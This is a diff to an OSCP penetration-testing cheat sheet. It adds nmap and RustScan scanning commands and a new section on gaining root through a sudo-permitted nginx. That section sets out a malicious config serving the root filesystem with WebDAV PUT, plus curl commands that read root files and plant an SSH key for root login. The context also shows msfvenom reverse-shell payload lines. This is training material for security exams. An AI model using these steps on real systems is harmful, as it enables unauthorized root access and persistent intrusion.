@@ -6,12 +6,18 @@ This repository describes cheat sheet and knowledge for OSCP.
 <!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
 **Table of Contents**
 
+- [oscp-cheatsheet](#oscp-cheatsheet)
+- [Contents](#contents)
 - [Enumeration](#enumeration)
   - [Network](#network)
     - [nmap](#nmap)
-      - [Example](#example)
+      - [Basic commands](#basic-commands)
       - [Options](#options)
-  - [RustNmap](#rustnmap)
+    - [UDP scanning](#udp-scanning)
+  - [RustScan](#rustscan)
+    - [Basic command](#basic-command)
+    - [Detect service and version](#detect-service-and-version)
+    - [Enumeration for UDO](#enumeration-for-udo)
   - [Windows Privilege Escalation](#windows-privilege-escalation)
     - [PowerUp.ps1](#powerupps1)
     - [Scan](#scan)
@@ -22,9 +28,9 @@ This repository describes cheat sheet and knowledge for OSCP.
     - [pspy](#pspy)
 - [Password Cracking](#password-cracking)
   - [hydra](#hydra)
-      - [Example](#example-1)
+      - [Example](#example)
   - [John the ripper](#john-the-ripper)
-      - [Example](#example-2)
+      - [Example](#example-1)
   - [hashcat](#hashcat)
   - [Webpages](#webpages)
     - [Hashes](#hashes)
@@ -44,7 +50,7 @@ This repository describes cheat sheet and knowledge for OSCP.
         - [bitquark-subdomains-top100000.txt](#bitquark-subdomains-top100000txt)
 - [JWT (JSON Web Token) exploit](#jwt-json-web-token-exploit)
     - [Debugger](#debugger)
-    - [jwt_tool](#jwt_tool)
+    - [jwt\_tool](#jwt_tool)
       - [tampering](#tampering)
       - [exploit](#exploit)
 - [SSTI (Server-Side Template Injection)](#ssti-server-side-template-injection)
@@ -68,7 +74,7 @@ This repository describes cheat sheet and knowledge for OSCP.
 - [Git](#git)
   - [Dump .git](#dump-git)
 - [Linux command](#linux-command)
-  - [Basic command](#basic-command)
+  - [Basic command](#basic-command-1)
     - [Show allowing commands as root user](#show-allowing-commands-as-root-user)
     - [Run command as other user](#run-command-as-other-user)
     - [Show file type](#show-file-type)
@@ -118,6 +124,8 @@ This repository describes cheat sheet and knowledge for OSCP.
     - [Windows](#windows)
       - [exe](#exe)
       - [exe-service](#exe-service)
+- [Nginx](#nginx)
+  - [Malicious conf file to get root privilege](#malicious-conf-file-to-get-root-privilege)
 - [BurpSuite](#burpsuite)
   - [Hot Keys](#hot-keys)
 - [Others](#others)
@@ -138,7 +146,7 @@ This repository describes cheat sheet and knowledge for OSCP.
 # Enumeration
 ## Network
 ### nmap
-#### Example
+#### Basic commands
 ```console
 nmap -sV -T4 -Pn <Target IP Address>
 ```
@@ -149,13 +157,31 @@ nmap -sV -T4 -Pn <Target IP Address>
 `-A`: Detect OS and its version.  
 `-p`: Specify range of ports. Scan all ports (1-65535) if using the option `-p-`  
 
-## RustNmap
+### UDP scanning
+```
+sudo nmap -sU -p- $IP --min-rate=10000 -v
+```
+
+## RustScan
 This tool is faster tool than nmap.
 https://github.com/RustScan/RustScan
 
+### Basic command
 ```
 rustscan -a <target ip> -- <nmap options>
 ```
+
+### Detect service and version
+Detect service and versions in 22/tcp and 80/tcp
+```
+rustscan -a $IP --ports 22,80 -- -sC -sV
+```
+
+### Enumeration for UDO
+```
+rustscan -a $IP --udp -- -Pn -T4
+```
+
 
 
 ## Windows Privilege Escalation
@@ -619,6 +645,52 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -e x86/shikata
 #### exe-service
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -e x86/shikata_ga_nai -f exe-service -o evil.exe
+```
+
+# Nginx
+## Malicious conf file to get root privilege
+Check running the nginx by using sudo:
+```shell
+sudo -l
+
+(ALL : ALL) NOPASSWD: /usr/sbin/nginx
+```
+
+Create the following conf file to access '/':
+```
+user root;
+worker_processes 4;
+pid /tmp/nginx.pid;
+events {
+    worker_connections 768;
+}
+http {
+    server {
+        listen 1337;
+        root /;
+        autoindex on;
+
+        dav_methods PUT;
+    }
+}
+```
+
+Run the nginx by using malicious conf file.
+```
+sudo nginx -c /tmp/exploit.conf
+```
+
+Then, we can get a file by curl command.
+``` shell
+curl 127.0.0.1:1337/root/root.txt
+```
+or access the target by ssh with root privilege:
+```
+ssh-keygen
+<snip...>
+
+curl -X PUT 10.129.230.87:1337/root/.ssh/authorized_keys --upload-file root.pub
+ssh -i root root@<target ip>
 ```
 
 # BurpSuite
